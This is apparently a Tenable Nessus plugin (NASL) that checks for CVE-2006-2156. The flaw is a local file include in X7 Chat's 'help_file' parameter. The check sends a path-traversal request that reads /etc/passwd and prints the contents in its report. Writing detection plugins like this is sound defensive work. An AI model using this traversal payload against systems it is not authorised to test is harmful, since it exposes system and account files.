#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include issue. 

Description :

The remote host is running X7 Chat, a web-based chat program written
in PHP. 

The version of X7 Chat installed on the remote host fails to properly
sanitize input to the 'help_file' parameter of the 'help/index.php'
script before using it in a PHP 'include_once()' function.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit this issue to view arbitrary files or
to execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2006-05/0028.html
http://x7chat.com/support_forum/index.php/topic,2143.0.html

Solution :

Upgrade to X7 Chat version 2.0.3 or later.

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21312);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-2156");
  script_bugtraq_id(17777);
  script_xref(name:"OSVDB", value:"25149");

  script_name(english:"X7 Chat help_file Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read a local file using X7 Chat");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/x7chat", "/chat", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit a flaw to read the albums folder index.php.
  file = "../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/help/index.php?",
      "help_file=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like X7 Chat and...
    "<title>X7 Chat Help Center" >< res &&
    # there's an entry for root
    egrep(pattern:"root:.*:0:[01]:", string:res)
  )
  {
    contents = res - strstr(res, "<br");

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the repeated contents of the file '/etc/passwd'\n",
      "that Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
